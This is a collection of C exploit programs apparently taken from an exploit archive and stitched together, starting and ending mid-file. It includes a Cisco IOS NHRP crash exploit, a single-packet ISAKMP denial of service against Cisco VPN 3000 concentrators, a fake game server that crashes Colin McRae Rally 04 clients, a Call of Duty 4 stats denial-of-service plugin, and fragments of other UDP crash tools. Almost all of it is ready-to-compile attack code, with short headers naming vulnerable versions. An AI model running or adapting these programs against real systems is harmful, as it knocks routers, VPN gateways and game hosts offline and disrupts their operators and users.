      memcpy(packetck+sizeof(struct pseudoudp)+8,snmpkill,datasize);

      UDP->check = in_cksum((u_short *)packetck,8+datasize+sizeof(struct pseudoudp));    

data   = (unsigned char    *)(packet+20+8); 
memcpy(data,snmpkill,datasize);  
                                                                                                     
dest.sin_family=AF_INET;
dest.sin_addr.s_addr=destip_addr.s_addr;                                                                        

while (i<p_number)
{
if (( sendto(sok,packet,20+8+datasize,0,( struct sockaddr * ) &dest,sizeof(dest)))<0)
{
printf("Error sending packet.\n");
exit(EXIT_FAILURE);
}

i++;

}
printf("%d packets sent.\n",i);

}




/******************************************************************************/
/*                                                                            */
/* nhrp-dos - Copyright by Martin Kluge, <mk@elxsi.de>                        */
/*                                                                            */
/* Feel free to modify this code as you like, as long as you include the      */
/* above copyright statement.                                                 */
/*                                                                            */
/* Please use this code only to check your OWN cisco routers.                 */
/*                                                                            */
/* Cisco bug ID: CSCin95836                                                   */
/*                                                                            */
/* The Next-Hop-Resolution Protocol (NHRP) is defined in RFC2332. It is used  */
/* by a source host/router connected to a Non-Broadcast-Multi-Access (NBMA)   */
/* subnetwork to determine the internetworking layer address and NBMA         */
/* subnetwork addresses of the NBMA next hop towards the destination.         */
/* NHRP is often used for dynamic multipoint VPNs (DMVPN) in combination with */
/* IPSEC.                                                                     */
/*                                                                            */
/* URLs:                                                                      */
/* - [RFC2332/NHRP]       http://rfc.net/rfc2332.html                         */
/* - [RFC1701/GRE]        http://rfc.net/rfc1701.html                         */
/* - [DMVPNs with Cisco]  http://www.cisco.com/en/US/tech/tk583/tk372/techno  */
/*                        logies_white_paper09186a008018983e.shtml            */
/*                                                                            */
/* This code was only tested on FreeBSD and Linux, no warranty is or will be  */
/* provided.                                                                  */
/*                                                                            */
/* Vulnerable images (tested):                                                */
/*                                                                            */
/*  - c7100-jk9o3s-mz.123-12e.bin                                             */
/*  - c7200-jk8o3s-mz.122-40.bin                                              */
/*  - c3640-js-mz.122-15.T17.bin                                              */
/* (and many other IOS versions on different platforms)                       */
/*                                                                            */
/* Vulnerable configuration on cisco IOS:                                     */
/*                                                                            */
/* interface Tunnel0                                                          */
/*  ip address 10.0.0.1 255.255.255.128                                       */
/*  no ip redirects                                                           */
/*  no ip proxy-arp                                                           */
/*  ip mtu 1464                                                               */
/*  ip nhrp authentication mysecret                                           */
/*  ip nhrp network-id 1000                                                   */
/*  ip nhrp map multicast dynamic                                             */
/*  ip nhrp server-only                                                       */
/*  ip nhrp holdtime 30                                                       */
/*  tunnel source FastEthernet0/0                                             */
/*  tunnel mode gre multipoint                                                */
/*  tunnel key 123456789                                                      */
/*                                                                            */
/* This exploit works even if "ip nhrp authentication" is configured on the   */
/* cisco router. You can also specify a GRE key (use 0 to disable this        */
/* feature) if the GRE tunnel is protected. You don't need to know the        */
/* NHRP network id (or any other configuration details, except the GRE key if */
/* it is set on the target router).                                           */
/*                                                                            */
/* NOTE: The exploit only seems to work, if a NHRP session between the target */
/*       router and at least one client is established.                       */
/*                                                                            */
/* Code injection is also possible (thanks to sky for pointing this out), but */
/* it is not very easy and depends heavily on the IOS version / platform.     */
/*                                                                            */
/* Example:                                                                   */
/* root@elxsi# ./nhrp-dos vr0 x.x.x.x 123456789                               */
/*                                                                            */
/* Router console output:                                                     */
/*                                                                            */
/* -Traceback= 605D89A0 605D6B50 605BD974 605C08CC 605C2598 605C27E8          */
/* $0 : 00000000, AT : 62530000, v0 : 62740000, v1 : 62740000                 */
/* <snip>                                                                     */
/* EPC : 605D89A0, ErrorEPC : BFC01654, SREG : 3400FF03                       */
/* Cause 00000024 (Code 0x9): Breakpoint exception                            */
/*                                                                            */
/* Writing crashinfo to bootflash:crashinfo_20070321-155011                   */
/* === Flushing messages (16:50:12 CET Wed Mar 21 2007) ===                   */
/*                                                                            */
/* Router reboots or sometimes hangs ;)                                       */
/*                                                                            */
/*                                                                            */
/* Workaround: Disable NHRP ;)                                                */
/*                                                                            */
/* I'd like to thank the Cisco PSIRT and Clay Seaman-Kossmey for their help   */
/* regarding this issue.                                                      */
/*                                                                            */
/* Greetings fly to: sky, chilli, arbon, ripp, huega, gh0st, argonius, s0uls, */
/*                   xhr, bullet, nanoc, spekul, kaner, d, slobo, conny, H-Ra */
/*                   and #infiniteVOID                                        */
/*                                                                            */
/******************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>

/* BSD */
#define _BSD

/* Header sizes */
#define IP_HDR_SIZE     20
#define GRE_HDR_SIZE    4
#define GRE_KEY_SIZE    4
#define NHRP_HDR_SIZE   62

/* Function prototypes */
int open_socket (void);
int close_socket (int);
int send_dos(int, unsigned long, unsigned long, unsigned long);
unsigned long resolve_ip (char *);
unsigned long get_int_ipv4 (char *);

/* Globals */
int sockfd;
int nhrp_req_id;

/* GRE header */
struct gre_h {
        unsigned short flags;   /* GRE flags */
        unsigned short ptype;   /* GRE protocol type */
        unsigned int   key;     /* GRE key */
};

/* NHRP header */
struct nhrp_h { 
/* NHRP fixed header (20 bytes) */
        struct {
                unsigned short afn;             /* NHRP AFN */ 
                unsigned short proto;           /* NHRP protocol type */
                unsigned int   snap;            /* NHRP SNAP */
                unsigned short snapE:8;         /* NHRP SNAP */
                unsigned short hops:8;          /* NHRP hop count */
                unsigned short length;          /* NHRP total length */
                unsigned short checksum;        /* NHRP checksum */
                unsigned short mpoa_ext;        /* NHRP MPOA extensions */
                unsigned short version:8;       /* NHRP version */
                unsigned short type:8;          /* NHRP type */
                unsigned short nbma_addr:8;     /* NHRP t/l of NBMA address */
                unsigned short nbma_sub:8;      /* NHRP t/l of NBMA subaddr */
        } fixed; 

        /* NHRP mandatory part */
        struct {
                unsigned short src_len:8;       /* NHRP src protocol length */
                unsigned short dst_len:8;       /* NHRP dest protocol length */
                unsigned short flags;           /* NHRP flags */
                unsigned int   request_id;      /* NHRP request ID */
                unsigned long  client_nbma;     /* NHRP client NBMA address */
                unsigned long  client_nbma_sub; /* NHRP client NBMA subaddr */
                unsigned long  client_pro_addr; /* NHRP client protocol addr */
        } mand;

        /* NHRP client information entries (CIE) */
        union {
                struct {
                        unsigned short code:8;          /* NHRP code */
                        unsigned short pref_len:8;      /* NHRP prefix length */
                        unsigned short reserved;        /* NHRP reserved */
                        unsigned short mtu;             /* NHRP MTU */
                        unsigned short holding_time;    /* NHRP holding time */
                        unsigned short len_client:8;    /* NHRP t/l cl addr */
                        unsigned short len_client_sub:8;/* NHRP t/l cl sub */
                        unsigned short len_client_pro:8;/* NHRP t/l cl pro */
                        unsigned short preference:8;    /* NHRP preference */
                        unsigned short ext;             /* NHRP extension */
                } cie;
        };
};


/* Main function */
int main (int argc, char **argv) {
        /* Check command line */
        if(argc != 4) {
                fprintf(stderr, "\nnhrp-dos (c) by Martin Kluge <mk@elxsi.de>, 2007\n");
                fprintf(stderr, "------------------------------------------------\n");
                fprintf(stderr, "Usage: ./nhrp-dos <device> <target> <GRE key>\n");
                fprintf(stderr, "(Set GRE key = 0 to disable GRE keys!)\n\n");
                exit(EXIT_FAILURE);
        }

        /* Check UID */
        if(getuid() != 0 && geteuid() != 0) {
                fprintf(stderr, "Error: Please run as root!\n");
                exit(EXIT_FAILURE);
        }

        /* Open a socket */
        sockfd = open_socket();

        /* Send DoS packet */
        send_dos(sockfd, get_int_ipv4(argv[1]), resolve_ip(argv[2]), atoi(argv[3]));

        /* Close the socket */
        close_socket(sockfd);
        
        exit(EXIT_SUCCESS);
}


/* Open the socket */
int open_socket (void)
{
        int fd;
        int one = 1;
        void *ptr = &one;

        /* Open the socket */
        fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(fd < 0) {
                fprintf(stderr, "Error: open_socket: Unable to open socket.\n");
                exit(EXIT_FAILURE);
        }

        /* Set IP_HDRINCL to include the IPv4 header in outgoing packets. */
        /* Otherwise it would be done by the kernel. */
        if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, ptr, sizeof(one)) < 0) {
                fprintf(stderr, "Error: open_socket: setsockopt failed.\n");
                exit(EXIT_FAILURE);
        }

        #ifndef _BSD
        if(setsockopt(fd, IPPROTO_IP, SO_BROADCAST, ptr, sizeof(one)) < 0) {
                fprintf(stderr,"Error: open_socket: setsockopt failed.\n");
                exit(EXIT_FAILURE);
        }
        #endif

        return(fd);
}


/* Close the socket */
int close_socket (int fd)
{
        return(close(fd));
}


/* Resolve the hostname to IP address */
unsigned long resolve_ip (char *host)
{
        struct in_addr addr;
        struct hostent *host_ent;

        if((addr.s_addr = inet_addr(host)) == -1) {
                if(!(host_ent = gethostbyname(host)))
                        return(-1);

                memcpy((char *)&addr.s_addr, host_ent->h_addr, host_ent->h_length);
        }

        return(addr.s_addr);
}


/* Get IPv4 address of DEVICE */
unsigned long get_int_ipv4 (char *device)
{
        int tmp_fd;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        tmp_fd = socket(PF_INET, SOCK_DGRAM, 0);

        if(tmp_fd < 0) {
                fprintf(stderr, "Error: get_int_ipv4: socket failed.\n");
                exit(EXIT_FAILURE);
        }

        memset(&ifr, 0, sizeof(ifr));
        sin = (struct sockaddr_in *) &ifr.ifr_addr;
        strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name));

        ifr.ifr_addr.sa_family = AF_INET;

        if(ioctl(tmp_fd, SIOCGIFADDR, (char *) &ifr) < 0) {
                fprintf(stderr, "Error: get_int_ipv4: ioctl failed.\n");
                exit(EXIT_FAILURE);
        }

        close(tmp_fd);
        return(sin->sin_addr.s_addr);
}


/* Send NHRP packet */
int send_dos (int fd, unsigned long src_ip, unsigned long dst_ip,
               unsigned long gre_key)
{
        struct ip ip_hdr;
        struct ip *iphdr;
        struct gre_h gre_hdr;
        struct nhrp_h nhrp_hdr;
        struct sockaddr_in sin;
        unsigned int bytes = 0;
        int GRE_SIZE = GRE_HDR_SIZE;

        /* Packet buffer */
        unsigned char *buf;

        if(gre_key!=0)
                GRE_SIZE+=GRE_KEY_SIZE;

        /* Allocate some memory */
        buf = malloc(IP_HDR_SIZE+GRE_SIZE+NHRP_HDR_SIZE);

        if(buf < 0) {
                fprintf(stderr, "Error: send_dos: malloc failed.\n");
                exit(EXIT_FAILURE);
        }

        /* Increment NHRP request ID */
        nhrp_req_id++;

        /* IPv4 Header */
        ip_hdr.ip_v             = 4;                    /* IP version */
        ip_hdr.ip_hl            = 5;                    /* IP header length */
        ip_hdr.ip_tos           = 0x00;                 /* IP ToS */
        ip_hdr.ip_len           = htons(IP_HDR_SIZE  +
                                   GRE_SIZE +
                                   NHRP_HDR_SIZE
                                  );                    /* IP total length */
        ip_hdr.ip_id            = 0;                    /* IP identification */
        ip_hdr.ip_off           = 0;                    /* IP frag offset */
        ip_hdr.ip_ttl           = 64;                   /* IP time to live */
        ip_hdr.ip_p             = IPPROTO_GRE;          /* IP protocol */
        ip_hdr.ip_sum           = 0;                    /* IP checksum */
        ip_hdr.ip_src.s_addr    = src_ip;               /* IP source */
        ip_hdr.ip_dst.s_addr    = dst_ip;               /* IP destination */

        /* GRE header */
        if(gre_key != 0) {
                gre_hdr.flags   = htons(0x2000);        /* GRE flags */
                gre_hdr.key     = htonl(gre_key);       /* GRE key */
        } else {
                gre_hdr.flags   = 0;
        }

        gre_hdr.ptype           = htons(0x2001);        /* GRE type (NHRP) */

        /* NHRP fixed header */
        nhrp_hdr.fixed.afn      = htons(0x0001);        /* NHRP AFN */
        nhrp_hdr.fixed.proto    = htons(0x0800);        /* NHRP protocol type */
        nhrp_hdr.fixed.snap     = 0;                    /* NHRP SNAP */
        nhrp_hdr.fixed.snapE    = 0;                    /* NHRP SNAP */
        nhrp_hdr.fixed.hops     = 0xFF;                 /* NHRP hop count */

        /* DoS -> Set length to 0xFFFF */
        nhrp_hdr.fixed.length   = htons(0xFFFF);        /* NHRP length */

        /* Checksum can be incorrect */
        nhrp_hdr.fixed.checksum = 0;                    /* NHRP checksum */

        nhrp_hdr.fixed.mpoa_ext = htons(0x0034);        /* NHRP MPOA ext */
        nhrp_hdr.fixed.version  = 1;                    /* NHRP version */
        nhrp_hdr.fixed.type     = 3;                    /* NHRP type */
        nhrp_hdr.fixed.nbma_addr= 4;                    /* NHRP NBMA t/l addr */
        nhrp_hdr.fixed.nbma_sub = 0;                    /* NHRP NBMA t/l sub */

        /* NHRP mandatory part */
        nhrp_hdr.mand.src_len   = 4;                    /* NHRP src proto len */
        nhrp_hdr.mand.dst_len   = 4;                    /* NHRP dst proto len */
        nhrp_hdr.mand.flags     = htons(0x8000);        /* NHRP flags */
        nhrp_hdr.mand.request_id  = htonl(nhrp_req_id); /* NHRP request ID */
        nhrp_hdr.mand.client_nbma = src_ip;             /* NHRP client addr */
        nhrp_hdr.mand.client_nbma_sub = 0;              /* NHRP client sub  */
        nhrp_hdr.mand.client_pro_addr = 0;              /* NHRP client proto */ 

        /* NHRP client information entries (CIE) */
        nhrp_hdr.cie.code       = 0;                    /* NHRP code */
        nhrp_hdr.cie.pref_len   = 0xFF;                 /* NHRP prefix len */
        nhrp_hdr.cie.reserved   = 0x0000;               /* NHRP reserved */
        nhrp_hdr.cie.mtu        = htons(1514);          /* NHRP mtu */
        nhrp_hdr.cie.holding_time = htons(30);          /* NHRP holding time */
        nhrp_hdr.cie.len_client = 0;                    /* NHRP t/l client */
        nhrp_hdr.cie.len_client_sub = 0;                /* NHRP t/l sub */
        nhrp_hdr.cie.len_client_pro = 0;                /* NHRP t/l pro */
        nhrp_hdr.cie.preference = 0;                    /* NHRP preference */
        nhrp_hdr.cie.ext        = htons(0x8003);        /* NHRP C/U/Type (ext)*/


        /* Copy the IPv4 header to the buffer */
        memcpy(buf, (unsigned char *) &ip_hdr, sizeof(ip_hdr));

        /* Copy the GRE header to the buffer */
        memcpy(buf + IP_HDR_SIZE, (unsigned char *) &gre_hdr, sizeof(gre_hdr));

        /* Copy the NHRP header to the buffer */
        memcpy(buf + IP_HDR_SIZE + GRE_SIZE, (unsigned char *) &nhrp_hdr,
                sizeof(nhrp_hdr));

        /* Fix some BSD bugs */
        #ifdef _BSD
        iphdr = (struct ip *) buf;
        iphdr->ip_len = ntohs(iphdr->ip_len);
        iphdr->ip_off = ntohs(iphdr->ip_off);
        #endif

        memset(&sin, 0, sizeof(struct sockaddr_in));
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = iphdr->ip_dst.s_addr;

        printf("\nnhrp-dos (c) by Martin Kluge <mk@elxsi.de>, 2007\n");
        printf("------------------------------------------------\n");
        printf("Sending DoS packet...");

        /* Send the packet */
        bytes = sendto(fd, buf, IP_HDR_SIZE + GRE_SIZE + NHRP_HDR_SIZE, 0,
                        (struct sockaddr *) &sin, sizeof(struct sockaddr));

        printf("DONE (%d bytes)\n\n", bytes);

        /* Free the buffer */
        free(buf);

        /* Return number of bytes */
        return(bytes);
}

// milw0rm.com [2007-08-09]
source: http://www.securityfocus.com/bid/5620/info

Cisco VPN 3000 series concentrators are prone to a denial of service condition when receiving an overly long username string during authentication from a VPN client.

Successful exploitation will cause the device to reload. 

/* ISAKMP Cisco VPN Concentrator DoS 
 * by nowin of Phenoelit <nowin@phenoelit.de>
 *    FX of Phenoelit <fx@phenoelit.de>
 * http://www.phenoelit.de
 * (C) 2002 
 *
 * Cisco VPN Concentrator 3000 Series, Software <=3.6.0 
 * Single Packet Denial of Service. 
 * The device will reboot upon receiving this packet.
 * This is probalby exploitable, but we don't have a Concentrator to test.
 *
 * Greets are in the packet.
 */

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>

#define SPLASH          \
        "Phenoelit Cisco VPN Killer\n" \
	" Cisco VPN Concentrator 3000 DoS (3.6.0 and below)\n" \
	" (C) 2002 - nowin of Phenoelit <nowin@phenoelit.de>\n" \
	"            FX of Phenoelit <fx@phenoelit.de>\n"


struct {
    struct in_addr	dest;
    int			sfd;
} cfg;


void *smalloc(size_t s);
int send500(char *packet, int len);


char	fixed_ISAKMP[] =
	"\xf0\x0d\xf0\x0d\xf0\x0d\xf0\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x01"
	"\x10\x04\x00\x00\x00\x00\x00\x00\x00\x0F\xFF\x04\x00\x01\x34\x00\x00"
	"\x00\x01\x00\x00\x00\x01\x00\x00\x01\x28\x01\x01\x00\x08\x03\x00\x00"
	"\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x04\x00\x02"
	"\x80\x03\xfd\xe9\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x20\xc4\x9b\x03"
	"\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x04"
	"\x00\x02\x80\x03\xfd\xe9\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x20\xc4"
	"\x9b\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02"
	"\x80\x04\x00\x02\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00"
	"\x20\xc4\x9b\x03\x00\x00\x24\x04\x01\x00\x00\x80\x01\x00\x05\x80\x02"
	"\x00\x01\x80\x04\x00\x02\x80\x03\x00\x01\x80\x0b\x00\x01\x00\x0c\x00"
	"\x04\x00\x20\xc4\x9b\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x01"
	"\x80\x02\x00\x02\x80\x04\x00\x02\x80\x03\xfd\xe9\x80\x0b\x00\x01\x00"
	"\x0c\x00\x04\x00\x20\xc4\x9b\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01"
	"\x00\x01\x80\x02\x00\x01\x80\x04\x00\x02\x80\x03\xfd\xe9\x80\x0b\x00"
	"\x01\x00\x0c\x00\x04\x00\x20\xc4\x9b\x03\x00\x00\x24\x03\x01\x00\x00"
	"\x80\x01\x00\x01\x80\x02\x00\x02\x80\x04\x00\x02\x80\x03\x00\x01\x80"
	"\x0b\x00\x01\x00\x0c\x00\x04\x00\x20\xc4\x9b\x00\x00\x00\x24\x04\x01"
	"\x00\x00\x80\x01\x00\x01\x80\x02\x00\x01\x80\x04\x00\x02\x80\x03\x00"
	"\x01\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x20\xc4\x9b\x0a\x00\x00\x84"
	"\x41\x6E\x64\x20\x50\x68\x65\x6E\x6F\x65\x6C\x69\x74\x20\x73\x61\x79"
	"\x73\x3A\x20\x54\x68\x69\x73\x20\x62\x75\x67\x20\x69\x73\x20\x61\x77"
	"\x61\x72\x64\x65\x64\x20\x74\x6F\x20\x53\x65\x61\x6E\x20\x43\x6F\x6E"
	"\x76\x65\x72\x79\x20\x66\x6F\x72\x20\x65\x78\x63\x65\x6C\x6C\x65\x6E"
	"\x63\x65\x20\x69\x6E\x20\x63\x6F\x70\x79\x20\x61\x6E\x64\x20\x70\x61"
	"\x73\x74\x65\x2E\x20\x47\x72\x65\x65\x74\x73\x3A\x20\x48\x61\x6C\x76"
	"\x61\x72\x2C\x52\x69\x6C\x65\x79\x2C\x4E\x69\x63\x6F\x26\x53\x65\x62"
	"\x61\x73\x74\x69\x65\x6E\x2E\x2E\x2E"
	"\x05\x00\x00\x18 -==| PHENOELIT |==-" 
	"\x00\x00\x00\x04\x0b\x11\x01\xf4 Eat this and die!"
	;


int main(int argc, char **argv) {
    char		option;
    extern char		*optarg;

    int			plen;
    char		*c;


    printf("%s\n",SPLASH);

    memset(&cfg,0,sizeof(cfg));
    while ((option=getopt(argc,argv,"d:"))!=EOF) {
	switch (option) {
	    case 'd':	if (inet_aton(optarg,&(cfg.dest))==0) {
			    fprintf(stderr,"Address of -d argument not IP\n");
			    return (1);
			}
			break;
	    default:	fprintf(stderr,"%s -d <ip_address>\n",argv[0]);
			return (1);
	}
    } 

    if (!(*((u_int32_t *)&(cfg.dest)))) {
	fprintf(stderr,"%s -d <ip_address>\n",argv[0]);
	return (1);
    }

    plen=sizeof(fixed_ISAKMP)-1;
    c=(char *)smalloc(plen);
    memcpy(c,fixed_ISAKMP,sizeof(fixed_ISAKMP)-1);

    send500(c,plen);

    printf("Packet sent.\n");

    free (c);
    return 0;
}


int send500(char *packet, int len) {
    struct sockaddr_in	sin;

    if ((cfg.sfd=socket(PF_INET,SOCK_DGRAM,IPPROTO_UDP))<0) {
	perror("socket()");
	return (-1);
    }

    memset(&sin,0,sizeof(struct sockaddr_in));
    sin.sin_family=PF_INET;
    sin.sin_port=htons(500);
    memcpy(&(sin.sin_addr),&(cfg.dest),sizeof(sin.sin_addr));
    if (sendto(cfg.sfd,packet,len,0,
		(struct sockaddr *)&sin,
		sizeof(struct sockaddr_in))<=0) {
	perror("sendto()");
	return (-1);
    }

    return (0);

}

void *smalloc(size_t s) {
    void *p;

    if ((p=malloc(s))==NULL) {
	fprintf(stderr,"smalloc(): fatal! Allocation of %u bytes failed\n",s);
	exit (-1);
    }
    memset(p,0,s);
    return p;
}
/*

by Luigi Auriemma

UNIX & WIN VERSION
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif




#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        30000
#define PLAYBUG     "2147483647"        /* THE BUG IS HERE! */
#define PING        "\x05\x00\x00\x00\x00\x00"
#define GAMEVER     "1.0"               /* Retail game */
//#define GAMEVER     "Lan Demo 1.0"    /* demo game */



void std_err(void);



int main(int argc, char *argv[]) {
    int     sd,
            len,
            on = 1,
            psz;
    struct  sockaddr_in peer;
    u_char  *buff,
            *pck,
            pcklan[] =
                "\x00\x00\x00\x00\x00"
                "hostname\0"    "You crash\0"
                "gamever\0"     GAMEVER"\0"
                "hostport\0"    "30000\0"
                "password\0"    "0\0"
                "gametype\0"    "Stages, ESP P1\0"
                "gamemode\0"    "openwaiting\0"
                "numplayers\0"  PLAYBUG"\0"
                "maxplayers\0"  "4\0"
                "rally\0"       "0\0"
                "stages\0"      "100\0"
                "damage\0"      "0\0"
                "ranking\0"     "0\0"
                "cartype\0"     "0\0",
            pckinternet[] =
                "\x00\x00\x00\x00\x00"
                "You crash\0"
                GAMEVER"\0"
                "0\0"
                "Stages, ESP P1\0"
                "openwaiting\0"
                PLAYBUG"\0"
                "4\0";


    setbuf(stdout, NULL);

    fputs("\n"
        "Colin McRae Rally 04 1.0 broadcast client crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    peer.sin_addr.s_addr = INADDR_ANY;
    peer.sin_port        = htons(PORT);
    peer.sin_family      = AF_INET;
    psz                  = sizeof(peer);

    printf("\n"
        "The game version that will be used is \"%s\"\n"
        "  Only the clients with the same version you use here will be vulnerable,\n"
        "  modify the source code (GAMEVER) to change this version\n"
        "\n"
        "Binding UDP port %u\n",
        GAMEVER, PORT);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
      < 0) std_err();
    if(bind(sd, (struct sockaddr *)&peer, psz)
      < 0) std_err();

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    fputs("\nClients:\n", stdout);
    while(1) {
        len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);
        if(len < 0) std_err();

        if(buff[2]) {
            printf("PING       %s:%hu\n",
                inet_ntoa(peer.sin_addr), htons(peer.sin_port));

            if(sendto(sd, PING, sizeof(PING) - 1, 0, (struct sockaddr *)&peer, psz)
              < 0) std_err();
            continue;
        }

        if(len == 10) {
            fputs("LAN        ", stdout);
            pck = pcklan;
            len = sizeof(pcklan) - 1;
        } else {
            fputs("INTERNET   ", stdout);
            pck = pckinternet;
            len = sizeof(pckinternet) - 1;
        }

        printf("%s:%hu\n",
            inet_ntoa(peer.sin_addr), htons(peer.sin_port));

        memcpy(pck, buff + 2, 5);
        if(sendto(sd, pck, len, 0, (struct sockaddr *)&peer, psz)
          < 0) std_err();
    }

    close(sd);
    return(0);
}





#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
cod4statz plugin for sudppipe
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "q3huff.h"

#ifdef WIN32
    #include <windows.h>

    BOOL WINAPI _DllMainCRTStartup(HANDLE hInst, ULONG ul_reason_for_call, LPVOID lpReserved) {
        return(TRUE);
    }
    BOOL WINAPI _DllMain(HANDLE hInst, ULONG ul_reason_for_call, LPVOID lpReserved) {
        return(TRUE);
    }
#else
    // gcc -shared -fPIC -o FILE.SO FILE.C
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER     "Call of Duty 4 <= 1.5 stats in-game Denial of Service 0.1 (sudppipe)"



int sudp_init(u8 *data) {
    printf("- PLUGIN: %s\n", VER);

    if(data && !data[0]) {
        printf("- no plugin's options\n");
        return(1);
    }
    return(0);
}



int sudp_pck(u8 *data, int len) {
    if(len < 13) return(len);
    if(memcmp(data, "\xff\xff\xff\xff" "stats\0", 10)) return(len);
    printf("- malformed stats packet activated\n");
    data[12] = 7;
    return(len);
}



int sudp_vis(u8 *data, int len) {
    return(len);
}


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

/* Moved to one file milw0rm.com - ceaglesock.zip */

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER     "0.1"
#define BUFFSZ  2048
#define PORT    24711
#define TIMEOUT 3
#define INFO    "\x3D\x00\x00\x00\x00\x3D\x00\x00"  // pre-built
#define BOOM    ""  // 0 bytes, a cool bug

#define SEND(x) if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                  < 0) std_err();
#define RECV    if(timeout(sd) < 0) { \
                    fputs("\n" \
                        "Error: socket timeout, no reply received\n" \
                        "\n", stdout); \
                    exit(1); \
                } \
                len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                if(len < 0) std_err();



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ];
    struct  sockaddr_in peer;


    setbuf(stdout, NULL);

    fputs("\n"
